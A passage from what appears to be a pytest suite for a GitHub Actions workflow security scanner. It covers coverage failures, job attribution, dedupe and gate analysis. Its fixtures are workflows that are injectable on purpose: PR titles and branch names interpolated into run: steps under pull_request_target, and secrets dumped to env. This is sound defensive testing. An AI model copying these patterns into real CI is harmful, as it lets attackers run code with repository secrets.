        "          ref: ${{ github.event.pull_request.head.sha }}\n"
        "      - run: make bench\n"
    ))
    # Sanity: the intact catalog finds the chain.
    good = _scan_with_catalog(tmp_path, _catalog_copy(tmp_path))
    assert good.returncode == 0
    assert "P14.9" in {f["pattern"] for f in json.loads(good.stdout)["findings"]}

    broken = _catalog_copy(
        tmp_path,
        ("correlation: untrusted-checkout-executes",
         "correlation: untrusted-checkout-execute"),   # typo: missing `s`
    )
    proc = _scan_with_catalog(tmp_path, broken)
    assert proc.returncode == 1, (
        "a catalog typo silently deleted a chain and the scan still exited 0"
    )
    assert "coverage" in proc.stderr.lower() or "broken" in proc.stderr.lower()
    assert "reinstall" in proc.stderr.lower()
    assert proc.stdout.strip() == "", "no findings JSON may be emitted"


def test_defective_metadata_block_is_a_loud_exit(tmp_path: Path) -> None:
    """Same contract for a METADATA block that fails to parse at all."""
    _write_workflow(tmp_path, "ok.yml", "on: push\njobs:\n  b:\n    runs-on: x\n")
    broken = _catalog_copy(tmp_path, ("detector: yaml-run-injection", "detector: nonsense"))
    proc = _scan_with_catalog(tmp_path, broken)
    assert proc.returncode == 1
    assert proc.stdout.strip() == ""


def test_scan_stamps_every_evaluated_catalog_pattern(tmp_path: Path) -> None:
    """The stamp verify_report.py checks against the ten-vector manifest."""
    _write_workflow(tmp_path, "ok.yml", "on: push\njobs:\n  b:\n    runs-on: x\n")
    data = _scan_dir(tmp_path)
    assert data["catalog_patterns_evaluated"] == sorted([
        "P14.7", "P14.9", "P14.10", "P14.11", "P14.14",
        "P14.15", "P14.18", "P14.19", "P14.24", "P14.25",
    ])


def test_glob_metacharacter_in_the_repo_path_does_not_hide_workflows(
    tmp_path: Path,
) -> None:
    """A repo checked out under a directory whose NAME contains a glob
    metacharacter — `/tmp/repo[1]/` — used to scan zero files and report clean.

    The root was interpolated straight into the glob pattern, so `[1]` was read
    as a character class and matched nothing. Every workflow became invisible
    with no error and no coverage gap: the worst possible failure for a
    security scanner. The root is a path, not a pattern, so it is escaped.
    """
    weird = tmp_path / "repo[1]"
    _write_workflow(weird, "ci.yml", (
        "on: pull_request_target\n"
        "jobs:\n"
        "  greet:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: echo ${{ github.event.pull_request.title }}\n"
    ))
    data = _scan_dir(weird)
    assert data["scanned_workflows"] == 1, "the workflow was not discovered"
    assert "P14.10" in {f["pattern"] for f in data["findings"]}


def test_undiscovered_workflows_are_a_coverage_failure(
    tmp_path: Path, monkeypatch,
) -> None:
    """Belt-and-braces for the class C2 belongs to: if discovery ever returns
    nothing while `.github/workflows/` plainly holds YAML, that is a broken
    scan, not an empty repo — exit 1, not a clean report."""
    scan_mod = load_scan()
    _write_workflow(tmp_path, "ci.yml", "on: push\njobs:\n  b:\n    runs-on: x\n")
    monkeypatch.setattr(scan_mod, "all_workflow_files", lambda root: [])
    catalog = scan_mod.load_catalog(
        _SKILL_DIR / "references" / "security-patterns.md"
    )
    with pytest.raises(scan_mod.CoverageError, match="not discovered"):
        scan_mod.scan(catalog, tmp_path)


@pytest.mark.parametrize(
    "make_dir, why",
    [
        (True, "an existing but empty .github/workflows directory"),
        (False, "a repo with no .github/workflows directory at all"),
    ],
)
def test_zero_workflows_is_refused_not_reported_clean(
    tmp_path: Path, make_dir: bool, why: str
) -> None:
    """A repo with no workflows has nothing to grade.

    Every chain check passes vacuously, the scored config facts hand a
    workflow-less tree 83.3/100, and the report renders ten green rows plus
    "the impostor check ran". Both shapes must exit 1 and emit no findings.
    """
    if make_dir:
        (tmp_path / ".github" / "workflows").mkdir(parents=True)
    result = subprocess.run(
        [sys.executable, str(_SCAN_SCRIPT), "--root", str(tmp_path),
         "--gh-impostor", "off"],
        capture_output=True, text=True,
    )
    assert result.returncode == 1, f"{why} was reported as a clean scan"
    assert result.stdout.strip() == "", "a refused scan must emit no findings"


def test_gated_job_finding_names_the_gate(tmp_path: Path) -> None:
    """cal.com `pr.yml` shape: the cache-writing job is gated behind a
    trust-check output, and the report still read "a fork PR plants malware"
    without ever mentioning the gate.

    The gate is not a suppression — trust gates get bypassed — but the reader
    has to be able to see it to triage the finding.
    """
    _write_workflow(tmp_path, "pr.yml", (
        "on:\n"
        "  pull_request_target:\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    if: needs.trust-check.outputs.is-trusted == 'true'\n"
        "    steps:\n"
        "      - uses: actions/cache@v4\n"
        "        with:\n"
        "          path: node_modules\n"
        "          key: deps\n"
    ))
    data = _scan_dir(tmp_path)
    gated = [f for f in data["findings"] if f["pattern"] == "P14.7"]
    assert gated, "expected the P14.7 cache-write finding"
    assert "gate condition: needs.trust-check.outputs.is-trusted == 'true'" in (
        gated[0]["evidence"]
    ), f"the gate is missing from the evidence: {gated[0]['evidence']!r}"


def test_two_expressions_on_one_line_are_one_occurrence(tmp_path: Path) -> None:
    """sentry `frontend-snapshots.yml:66` shape: one `run:` line carrying two
    injectable expressions was emitted twice in the JSON.

    The renderer already collapsed them, but SKILL.md calls the JSON the source
    of truth — so ci-advisor and anything else binding to it counted the
    occurrence twice.
    """
    _write_workflow(tmp_path, "frontend-snapshots.yml", (
        "on:\n"
        "  pull_request_target:\n"
        "jobs:\n"
        "  snapshot:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        '      - run: echo "${{ github.event.pull_request.title }}'
        ' ${{ github.event.pull_request.body }}"\n'
    ))
    data = _scan_dir(tmp_path)
    keys = [(f["pattern"], f["workflow_file"], f["line"]) for f in data["findings"]]
    assert len(keys) == len(set(keys)), f"duplicate occurrences in the JSON: {keys}"
    assert [f["id"] for f in data["findings"]] == [
        f"f{i + 1}" for i in range(len(data["findings"]))
    ], "finding ids must stay contiguous after dedupe"


def test_line_anchored_finding_names_only_its_own_job(tmp_path: Path) -> None:
    """react shape: one injected line listed all 22 of the file's jobs as
    affected, contradicting the evidence's own single-job scope.

    A hit inside a job belongs to that job. A workflow-scope hit (the missing
    `permissions:` key, line 1) really does affect every job and keeps the
    whole list.
    """
    _write_workflow(tmp_path, "two_jobs.yml", (
        "on:\n"
        "  pull_request_target:\n"
        "permissions:\n"
        "  pull-requests: write\n"
        "jobs:\n"
        "  innocent:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        '      - run: echo hello\n'
        "  vulnerable:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        '      - run: echo "${{ github.event.pull_request.title }}"\n'
    ))
    data = _scan_dir(tmp_path)
    injections = [f for f in data["findings"] if f["pattern"] == "P14.10"]
    assert len(injections) == 1
    assert injections[0]["affected_jobs"] == ["vulnerable"], (
        "a line-anchored hit must name the job that contains it, got "
        f"{injections[0]['affected_jobs']}"
    )
    workflow_scope = [f for f in data["findings"] if f["pattern"] == "P14.18"]
    assert workflow_scope, "expected the workflow-scope permissions finding"
    for f in workflow_scope:
        assert f["affected_jobs"] == ["innocent", "vulnerable"], (
            "a workflow-scope grant affects every job, got "
            f"{f['affected_jobs']}"
        )


def test_job_ranges_clip_at_the_next_job_not_past_it(tmp_path: Path) -> None:
    """The overlap clip (`end = min(end, next_start - 1)`) is load-bearing.

    A job value's end mark points at the first token of the NEXT job, so
    without the clip the boundary line belongs to two jobs at once and the
    first one listed wins — silently crediting a hit to the wrong job.
    """
    wf = tmp_path / "boundary.yml"
    wf.write_text(
        "on: push\n"
        "jobs:\n"
        "  first:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: echo one\n"
        "  second:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: echo two\n",
        encoding="utf-8",
    )
    ranges = scan.job_line_ranges(wf)
    assert [r[0] for r in ranges] == ["first", "second"]
    (_n1, s1, e1), (_n2, s2, e2) = ranges
    assert e1 < s2, f"job ranges overlap: {ranges}"
    # Line 7 is `  second:` — the boundary. It must credit `second`.
    assert scan.job_at_line(ranges, 7) == "second"
    assert scan.job_at_line(ranges, 6) == "first"


def test_the_last_job_ends_where_the_jobs_block_ends(tmp_path: Path) -> None:
    """A workflow-level key written AFTER `jobs:` used to fall inside the last
    job, because the last job was clipped at end-of-document rather than at
    the end of the `jobs:` node."""
    wf = tmp_path / "trailing.yml"
    wf.write_text(
        "on: push\n"
        "jobs:\n"
        "  only:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: echo one\n"
        "defaults:\n"
        "  run:\n"
        "    shell: bash\n",
        encoding="utf-8",
    )
    ranges = scan.job_line_ranges(wf)
    assert scan.job_at_line(ranges, 6) == "only"
    assert scan.job_at_line(ranges, 7) is None, (
        f"`defaults:` (line 7) is workflow-scope, not part of a job: {ranges}"
    )
    # And a jobs block that runs to EOF still owns its last line.
    wf2 = tmp_path / "eof.yml"
    wf2.write_text(
        "on: push\n"
        "jobs:\n"
        "  only:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: echo one",
        encoding="utf-8",
    )
    assert scan.job_at_line(scan.job_line_ranges(wf2), 6) == "only"


def test_uncomputable_job_ranges_are_a_sentinel_not_an_empty_list(
    tmp_path: Path,
) -> None:
    """"We could not compute the ranges" and "this line is workflow-scope" are
    different facts that rendered identically.

    An empty list meant both, so a workflow whose YAML would not compose
    stamped every finding with the whole job list and read as a deliberate
    "affects all jobs" claim. The uncomputable case now returns None, and the
    finding carries a note saying which one the reader is looking at.
    """
    broken = tmp_path / "broken.yml"
    broken.write_text("jobs: [not, a, mapping]\n", encoding="utf-8")
    assert scan.job_line_ranges(broken) is None

    no_jobs = tmp_path / "nojobs.yml"
    no_jobs.write_text("on: push\nname: x\n", encoding="utf-8")
    assert scan.job_line_ranges(no_jobs) == [], (
        "a workflow that declares no jobs is a real, computable answer"
    )


def test_a_finding_says_when_its_job_list_is_a_fallback(
    tmp_path: Path,
) -> None:
    """A workflow whose line marks cannot be composed still gets findings from
    the regex detectors; those findings must not claim workflow scope."""
    # P14.14 is purely lexical, so it still fires on a file YAML cannot
    # compose — which is exactly the state where job attribution is unknown.
    _write_workflow(tmp_path, "unparseable.yml", (
        "on: push\n"
        "jobs:\n"
        "  build:\n"
        "    env:\n"
        "      ALL: ${{ toJSON(secrets) }}\n"
        "\tbad-tab: here\n"
    ))
    data = _scan_dir(tmp_path)
    findings = [f for f in data["findings"]
                if f["workflow_file"].endswith("unparseable.yml")]
    assert findings, "the regex detectors still run on an uncomposable file"
    assert all("affected_jobs_note" in f for f in findings), (
        "a finding whose job list is a fallback must say so: "
        f"{[f.get('affected_jobs_note') for f in findings]}"
    )


def test_folded_scalar_dropped_match_degrades_coverage(tmp_path: Path) -> None:
    """next.js `upload_preview_tarballs.yml` shape: a folded (`run: >`) scalar
    whose template expression spans the fold.

    PyYAML collapses the fold, so the expression matches the parsed scalar but
    cannot be located in the raw file and the hit is dropped. That drop used to
    go to stderr only, while the report still claimed complete coverage.

    It lands in `dropped_matches`, its OWN channel — NOT in `scan_incomplete`.
    `scan_incomplete` means "this file could not be read or parsed", which
    makes every workflow-scoped config fact unmeasurable; this file parsed
    perfectly. Folding the two together demoted every fact of a healthy repo to
    unmeasured over one folded scalar and graded it 0.0/100.
    """
    _write_workflow(tmp_path, "upload_preview_tarballs.yml", (
        "on:\n"
        "  pull_request_target:\n"
        "jobs:\n"
        "  upload:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: >\n"
        '          echo "${{ github.event.pull_request.title\n'
        '          }}"\n'
    ))
    data = _scan_dir(tmp_path)
    dropped = data["dropped_matches"]
    assert any(
        d["workflow_file"].endswith("upload_preview_tarballs.yml")
        for d in dropped
    ), f"the dropped match was not recorded: {dropped}"
    assert data["scan_incomplete"] == [], (
        "a file that parsed fine is not an unreadable file — a dropped match "
        f"must not land in scan_incomplete: {data['scan_incomplete']}"
    )


def test_a_dropped_match_does_not_unmeasure_the_config_facts(
    tmp_path: Path,
) -> None:
    """One folded `run: >` scalar must not grade a correct repo 0.0/100.

    Dropped matches used to be appended to `scan_incomplete`, and
    `config_facts` reads a non-empty `scan_incomplete` as "some workflow could
    not be scanned, so no claim about EVERY workflow is measurable" — every
    workflow-scoped fact went `unmeasured`. The file parsed; its facts are
    real.
    """
    _write_workflow(tmp_path, "folded.yml", (
        "on: push\n"
        "permissions:\n"
        "  contents: read\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: >\n"
        '          echo "${{ github.event.pull_request.title\n'
        '          }}"\n'
    ))
    data = _scan_dir(tmp_path)
    assert data["dropped_matches"], "expected the folded scalar to drop"
    score = data["security_score"]
    outcomes = {f["fact_id"]: f["outcome"] for f in score["facts"]}
    # The two API-gated facts (branch protection, fork-PR approval policy) are
    # unmeasured in this offline scan by contract — that is disclosure, not the
    # regression this test guards. Everything that reads workflow YAML must
    # still resolve: a dropped match is one expression the scanner could not
    # anchor, not an unreadable file, and treating it as a scan gap would take
    # every universal fact down with it.
    api_gated = {"sec.required-checks.skippable", "sec.fork-approval.effective"}
    assert {fid for fid, out in outcomes.items()
            if out == "unmeasured"} <= api_gated, (
        f"a dropped match unmeasured the config facts: {outcomes}"
    )
    assert score["score"] not in (None, 0.0), (
        f"a dropped match zeroed the score: {score['score']}"
    )


_FOLDED_WF = (
    "on: push\n"
    "jobs:\n"
    "  build:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - run: >\n"
    '          echo "${{ github.event.pull_request.title\n'
    '          }}"\n'
)


def test_a_dropped_match_path_is_never_absolute(tmp_path: Path) -> None:
    """The report is a shareable artifact; an absolute path leaks the
    operator's filesystem layout.

    The path is made repo-relative with `resolve().relative_to(root)`, which
    raises `ValueError` when the workflow really does resolve outside the root
    (a symlinked workflow directory). The fallback used to hand the raw
    absolute path straight through, so the one branch that needed the guard
    was the one branch that skipped it — both are pinned here.
    """
    _write_workflow(tmp_path, "folded.yml", _FOLDED_WF)
    data = _scan_dir(tmp_path)
    assert data["dropped_matches"]
    for d in data["dropped_matches"]:
        assert not d["workflow_file"].startswith("/"), (
            f"absolute path in a dropped-match entry: {d['workflow_file']}"
        )
    # The raising branch, exercised directly: `relative_to` cannot express
    # this one, and whatever the fallback returns must still not be absolute.
    outside = scan._repo_relative(
        "/somewhere/else/.github/workflows/x.yml", tmp_path)
    assert not outside.startswith("/"), outside
    assert outside.endswith(".github/workflows/x.yml"), outside


def test_alias_expanded_steps_are_recorded_not_silently_skipped(
    tmp_path: Path,
) -> None:
    """A YAML alias (`steps: *common`) expands into parsed steps that have no
    raw `run:` token of their own.

    Once the forward-only cursor runs past the file's last raw `run:` token,
    every remaining parsed run scalar is unanchorable — and used to be dropped
    with `continue`, no record, coverage rendered complete. Those steps were
    not scanned for injection sinks and the report has to say so.
    """
    _write_workflow(tmp_path, "aliased.yml", (
        "on: push\n"
        "x-common: &common\n"
        '  - run: echo "${{ github.event.issue.title }}"\n'
        "jobs:\n"
        "  a:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps: *common\n"
        "  b:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps: *common\n"
    ))
    data = _scan_dir(tmp_path)
    dropped = data["dropped_matches"]
    assert any(d["workflow_file"].endswith("aliased.yml") for d in dropped), (
        "an alias-expanded run: step went unscanned with no record: "
        f"{dropped}"
    )
    assert any("not scanned" in d["reason"].lower()
               or "NOT scanned" in d["reason"] for d in dropped), (
        f"the record does not say the step went unscanned: {dropped}"
    )


def test_dot_prefixed_workflow_is_scanned_not_refused(tmp_path: Path) -> None:
    """moby shape: `.github/workflows/.test.yml`.

    `glob`'s `*` will not match a leading dot, so discovery skipped the file
    while the coverage tripwire's directory listing saw it — every workflow in
    the repo went unreported behind a coverage refusal. The file must be
    scanned like any other workflow.
    """
    _write_workflow(tmp_path, ".test.yml", (
        "on:\n"
        "  pull_request_target:\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        '      - run: echo "${{ github.event.pull_request.title }}"\n'
    ))
    data = _scan_dir(tmp_path)
    assert data["scanned_workflows"] == 1, (
        "dot-prefixed workflow not discovered: "
        f"scanned_workflows={data['scanned_workflows']}"
    )
    assert "P14.10" in _patterns_for_file(data, ".test.yml")


def test_p147_silent_without_a_cache_step(tmp_path: Path) -> None:
    """P14.7 is a two-condition correlation, and BOTH legs need a negative.

    `pull_request_target` alone is not a finding in this catalog — that bare
    presence fact belongs to the scored config checks. Firing on it would turn
    P14.7 into the removed dangerous-triggers check under a different id.
    """
    _write_workflow(tmp_path, "label.yml", (
        "on: pull_request_target\n"
        "jobs:\n"
        "  label:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/labeler@v5\n"
    ))
    assert "P14.7" not in _patterns_for_file(_scan_dir(tmp_path), "label.yml")


def test_p147_silent_when_setup_node_has_no_cache_input(tmp_path: Path) -> None:
    """`actions/setup-node` only writes the shared cache when it is asked to.

    Treating the bare setup action as a cache write would fire P14.7 on most
    `pull_request_target` workflows in existence — the `cache:` input is the
    load-bearing half.
    """
    without = (
        "on: pull_request_target\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/setup-node@v4\n"
        "        with:\n"
        "          node-version: 22\n"
        "      - run: npm ci\n"
    )
    _write_workflow(tmp_path, "build.yml", without)
    assert "P14.7" not in _patterns_for_file(_scan_dir(tmp_path), "build.yml")

    # …and the same workflow WITH `cache:` does fire, so the negative above is
    # about the input, not about the fixture being inert.
    with_cache_root = tmp_path / "with-cache"
    _write_workflow(
        with_cache_root, "build.yml",
        without.replace("          node-version: 22\n",
                        "          node-version: 22\n          cache: npm\n"),
    )
    assert "P14.7" in _patterns_for_file(
        _scan_dir(with_cache_root), "build.yml"
    )


# -----------------------------------------------------------------------------
# Eval substrate: the evals/ fixtures must actually produce what evals.json
# claims, or every eval scores against a fiction.
# -----------------------------------------------------------------------------

_EVALS = _SKILL_DIR / "evals" / "files"


def test_eval_inject_fixture_fires_p1410() -> None:
    """Evals 1 and 5 both assert a P14.10 finding on `inject/ci.yml`."""
    patterns = _patterns_for_file(_scan_dir(_EVALS / "inject"), "ci.yml")
    assert "P14.10" in patterns, (
        "the inject eval fixture no longer produces the finding evals 1 and 5 "
        f"are graded on; it produced {sorted(patterns)}"
    )


def test_eval_clean_fixture_is_actually_clean() -> None:
    """Eval 2 grades a zero-findings run; the fixture must have none."""
    data = _scan_dir(_EVALS / "clean")
    assert data["findings"] == [], (
        f"the clean eval fixture now produces findings: "
        f"{[f['pattern'] for f in data['findings']]}"
    )
    assert data["scan_incomplete"] == []


def test_eval_pwn_request_fires_only_on_the_vulnerable_workflow() -> None:
    """Eval 3 asserts P14.9 on vulnerable.yml and silence on safe.yml."""
    data = _scan_dir(_EVALS / "pwn-request")
    assert "P14.9" in _patterns_for_file(data, "vulnerable.yml")
    assert _patterns_for_file(data, "safe.yml") == set()


def test_eval_many_findings_produces_the_exact_pattern_set() -> None:
    """Eval 4's expected output claims "9 of the 10 vectors".

    Asserted as exact set equality, not a floor: a drifted fixture that
    produced six would still satisfy "at least six distinct groups" while the
    eval's stated expectation quietly became false.
    """
    patterns = _all_patterns(_scan_dir(_EVALS / "many-findings"))
    assert patterns == {
        "P14.7", "P14.9", "P14.10", "P14.14",
        "P14.15", "P14.18", "P14.19", "P14.24", "P14.25",
    }, sorted(patterns)
    # The tenth vector, P14.11, is network-gated and cannot fire offline.
    assert "P14.11" not in patterns


def test_every_synthesized_evidence_is_labelled_derived() -> None:
    """Census, not spot-check: `evidence_kind` must match reality everywhere.

    `evidence_kind: source` promises the reader that the quoted lines are IN
    the file and they can go and find them. A correlated detector that
    synthesizes a sentence and defaults to `source` — the default a new
    detector inherits by simply not setting `derived` — breaks that promise
    quietly, and only a reader who went looking would ever notice.
    """
    for fixture in ("many-findings", "inject", "pwn-request"):
        root = _EVALS / fixture
        data = _scan_dir(root)
        for f in data["findings"]:
            wf_text = (root / f["workflow_file"]).read_text(encoding="utf-8")
            quoted = [
                re.sub(r"^\s*\d+:\s?", "", ln).replace(" <-- here", "")
                for ln in f["evidence"].splitlines()
            ]
            # Strip the multi-sink annotation the deduper appends.
            quoted = [re.sub(r"\s*<-- here:.*$", "", q).strip() for q in quoted]
            verbatim = all(not q or q in wf_text for q in quoted)
            if f["evidence_kind"] == "source":
                assert verbatim, (
                    f"{fixture}/{f['workflow_file']} finding {f['id']} claims "
                    f"evidence_kind=source but its evidence is not in the "
                    f"file: {f['evidence']!r}"
                )
            else:
                assert f["evidence_kind"] == "derived", f["evidence_kind"]


def test_unparseable_workflow_is_reported_once_not_once_per_detector(
    tmp_path: Path,
) -> None:
    """Every detector re-parses each workflow, so one broken file printed the
    same multi-line PyYAML error seven to nine times and buried the rest of
    stderr. It is still reported — once — and still a coverage gap."""
    _write_workflow(tmp_path, "broken.yml", "on: push\njobs: [\n  - uses: x\n")
    result = subprocess.run(
        [sys.executable, str(_SCAN_SCRIPT), "--root", str(tmp_path),
         "--gh-impostor", "off"],
        capture_output=True, text=True, check=True,
    )
    n = result.stderr.count("YAML parse error in")
    assert n == 1, f"the parse failure was reported {n} times:\n{result.stderr}"
    data = json.loads(result.stdout)
    assert any(g["workflow_file"].endswith("broken.yml")
               for g in data["scan_incomplete"])


# ---------------------------------------------------------------------------
# Round-2 corpus QA regressions, each named for the repo that exposed it.
# ---------------------------------------------------------------------------


def test_calcom_job_line_is_the_job_key_not_the_blank_line_above_it(
    tmp_path: Path,
) -> None:
    """cal.com's `pr.yml`: `_job_line_in_text` used `^\\s+` under re.MULTILINE,
    and `\\s` matches a newline — so the match could START on the BLANK line
    separating two jobs and run through the line break into the next job's
    indentation. The reported line then landed inside the PRECEDING job's
    block, and a finding cited `jobs.trust-check` while its own evidence named
    `jobs.prepare`."""
    text = (
        "jobs:\n"
        "  prepare:\n"
        "    runs-on: ubuntu-latest\n"
        "\n"
        "  trust-check:\n"
        "    runs-on: ubuntu-latest\n"
    )
    lines = text.splitlines()
    for job, expected in (("prepare", 2), ("trust-check", 5)):
        got = scan._job_line_in_text(text, job)
        assert got == expected, (job, got)
        assert lines[got - 1].strip().startswith(job), lines[got - 1]


def test_calcom_head_ref_or_fallback_is_still_a_template_injection(
    tmp_path: Path,
) -> None:
    """cal.com's `production-build-without-database.yml:72` interpolates
    `${{ github.head_ref || github.ref_name }}` into a `run:` block holding
    roughly a dozen secrets. `||` returns its FIRST operand when truthy, so on
    a pull request the attacker-chosen branch name is exactly what reaches the
    shell — the fallback sanitizes nothing, and the finding was missed."""
    _write_workflow(tmp_path, "prod.yml", (
        "on: pull_request_target\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: echo ${{ github.head_ref || github.ref_name }}\n"
    ))
    catalog = scan.load_catalog(_SKILL_DIR / "references" / "security-patterns.md")
    data = scan.scan(catalog, tmp_path, gh_impostor="off")
    assert "P14.10" in _patterns_for_file(data, "prod.yml")


def test_a_safe_shaped_fallback_never_launders_a_text_shaped_primary() -> None:
    """The first operand decides. A `|| ''` on a PR title is still a title."""
    assert not scan._is_shape_safe_expression(
        "${{ github.event.pull_request.title || '' }}")
    assert not scan._is_shape_safe_expression(
        "${{ github.head_ref || github.ref_name }}")
    # …and a genuinely safe primary stays safe whatever the fallback is.
    assert scan._is_shape_safe_expression(
        "${{ github.event.pull_request.number || 0 }}")


def test_grafana_pull_request_commits_is_an_integer_not_an_injection_sink(
) -> None:
    """grafana's `trufflehog.yml:27` writes
    `$(( ${{ github.event.pull_request.commits }} + 2 ))` — shell ARITHMETIC on
    the value, which only parses because GitHub fills it in as an integer. It
    rendered HIGH, the same shape class as `.number`."""
    assert scan._is_shape_safe_expression(
        "${{ github.event.pull_request.commits }}")


def test_react_author_association_is_a_closed_enum_not_attacker_text() -> None:
    """facebook/react had four findings on `author_association`, a
    GitHub-generated closed enum (OWNER … NONE). No member carries a shell
    metacharacter and no outsider can add one. This REVERSES a class the
    catalog previously declared in scope."""
    for ctx in ("issue", "comment", "pull_request"):
        assert scan._is_shape_safe_expression(
            "${{ github.event." + ctx + ".author_association }}"), ctx


def test_inert_gate_is_named_as_inert(tmp_path: Path) -> None:
    """The Snowflake bug (Wiz, Jun 2026) reduced to its single live term.

    `snowflakedb/snowflake-connector-net`'s `jira_issue.yml` gated on
    `github.event.pull_request.user.login != '...'` under `issues` /
    `issue_comment`, neither of which populates a `pull_request`, so the
    comparison was `null != '...'` — always true, and the gate admitted every
    GitHub user.

    The gate in the real file is that term OR'd with another, so the scanner
    declines a whole-gate verdict there and only names the dead field; that
    disjunction is covered by
    `test_compound_gate_with_one_dead_term_keeps_the_verify_wording`. This
    fixture is the bare comparison, which is the shape a verdict IS offered
    for: the generic "verify it" wording is wrong here, because there is no
    remainder to verify.
    """
    _write_workflow(tmp_path, "jira_issue.yml", (
        "on:\n"
        "  issues:\n"
        "    types: [opened]\n"
        "  issue_comment:\n"
        "    types: [created]\n"
        "jobs:\n"
        "  create-issue:\n"
        "    runs-on: ubuntu-latest\n"
        "    if: github.event.pull_request.user.login != 'dependabot[bot]'\n"
        "    steps:\n"
        "      - run: echo '${{ github.event.issue.title }}'\n"
    ))
    data = _scan_dir(tmp_path)
    hits = [f for f in data["findings"] if f["pattern"] == "P14.10"]
    assert hits, "expected the P14.10 injection finding"
    evidence = hits[0]["evidence"] + str(hits[0].get("derived_note") or "")
    assert "github.event.pull_request" in evidence, (
        f"the gate is missing from the evidence entirely: {evidence!r}"
    )
    assert "inert" in evidence.lower(), (
        f"the gate is inert but the evidence does not say so: {evidence!r}"
    )


def test_live_gate_is_not_called_inert(tmp_path: Path) -> None:
    """The same gate under a trigger that DOES populate the object is a real
    control — it keeps the "verify it" wording and must never read as inert."""
    _write_workflow(tmp_path, "pr.yml", (
        "on:\n"
        "  pull_request_target:\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    if: github.event.pull_request.user.login != 'dependabot[bot]'\n"
        "    steps:\n"
        "      - run: echo '${{ github.event.pull_request.title }}'\n"
    ))
    data = _scan_dir(tmp_path)
    hits = [f for f in data["findings"] if f["pattern"] == "P14.10"]
    assert hits, "expected the P14.10 injection finding"
    assert "inert" not in (
        hits[0]["evidence"] + str(hits[0].get("derived_note") or "")
    ).lower(), (
        f"a live gate was reported as inert: {hits[0]['evidence']!r}"
    )


def test_gate_live_under_any_one_declared_trigger_is_not_inert(
    tmp_path: Path,
) -> None:
    """A workflow on several triggers references an object only ONE of them
    populates. That gate is live whenever that trigger fires, so the rule is
    "no declared trigger populates it" — not "this trigger doesn't"."""
    _write_workflow(tmp_path, "mixed.yml", (
        "on:\n"
        "  issues:\n"
        "  pull_request_target:\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    if: github.event.pull_request.user.login != 'dependabot[bot]'\n"
        "    steps:\n"
        "      - run: echo '${{ github.event.issue.title }}'\n"
    ))
    data = _scan_dir(tmp_path)
    hits = [f for f in data["findings"] if f["pattern"] == "P14.10"]
    assert hits, "expected the P14.10 injection finding"
    assert "inert" not in (
        hits[0]["evidence"] + str(hits[0].get("derived_note") or "")
    ).lower(), (
        f"a gate live under one declared trigger was called inert: "
        f"{hits[0]['evidence']!r}"
    )


def test_unknown_trigger_never_yields_an_inert_verdict(tmp_path: Path) -> None:
    """`workflow_call` carries the CALLER's event payload, which this file
    cannot see. Unknown payload → no verdict, never a guess."""
    _write_workflow(tmp_path, "reusable.yml", (
        "on:\n"
        "  workflow_call:\n"
        "  issues:\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    if: github.event.pull_request.user.login != 'dependabot[bot]'\n"
        "    steps:\n"
        "      - run: echo '${{ github.event.issue.title }}'\n"
    ))
    data = _scan_dir(tmp_path)
    hits = [f for f in data["findings"] if f["pattern"] == "P14.10"]
    assert hits, "expected the P14.10 injection finding"
    assert "inert" not in (
        hits[0]["evidence"] + str(hits[0].get("derived_note") or "")
    ).lower(), (
        f"an unknowable payload produced an inert verdict: "
        f"{hits[0]['evidence']!r}"
    )


def _p14_10_evidence(tmp_path: Path, name: str, body: str) -> str:
    _write_workflow(tmp_path, name, body)
    data = _scan_dir(tmp_path)
    hits = [f for f in data["findings"] if f["pattern"] == "P14.10"]
    assert hits, "expected the P14.10 injection finding"
    # The verbatim excerpt and the scanner's gate verdict are separate fields
    # (see RawHit.derived_note); a caller asking "what does this finding tell
    # the reader" wants both.
    return hits[0]["evidence"] + "\n" + str(hits[0].get("derived_note") or "")


def test_equality_gate_against_an_empty_value_never_reads_as_wide_open(
    tmp_path: Path,
) -> None:
    """`==` flips the verdict. `null != 'bot'` is always TRUE and admits
    everyone; `null == 'bot'` is always FALSE and admits nobody. Both are
    broken gates, but reporting the second as "does not restrict who reaches
    this job" tells the reader the exact opposite of what the gate does."""
    evidence = _p14_10_evidence(tmp_path, "eq.yml", (
        "on:\n"
        "  issues:\n"
        "    types: [opened]\n"
        "jobs:\n"
        "  create-issue:\n"
        "    runs-on: ubuntu-latest\n"
        "    if: github.event.pull_request.user.login == 'dependabot[bot]'\n"
        "    steps:\n"
        "      - run: echo '${{ github.event.issue.title }}'\n"
    ))
    assert "does not restrict who reaches this job" not in evidence, (
        f"an always-false gate was described as admitting everyone: "
        f"{evidence!r}"
    )
    assert "never runs" in evidence, (
        f"an always-false gate should say the job never runs: {evidence!r}"
    )


def test_compound_gate_with_one_dead_term_keeps_the_verify_wording(
    tmp_path: Path,
) -> None:
    """The dead term is only one conjunct. The gate as a whole still restricts
    who reaches the job — via the live term — so no INERT verdict is available,
    only the lookup fact plus the ordinary "verify it"."""
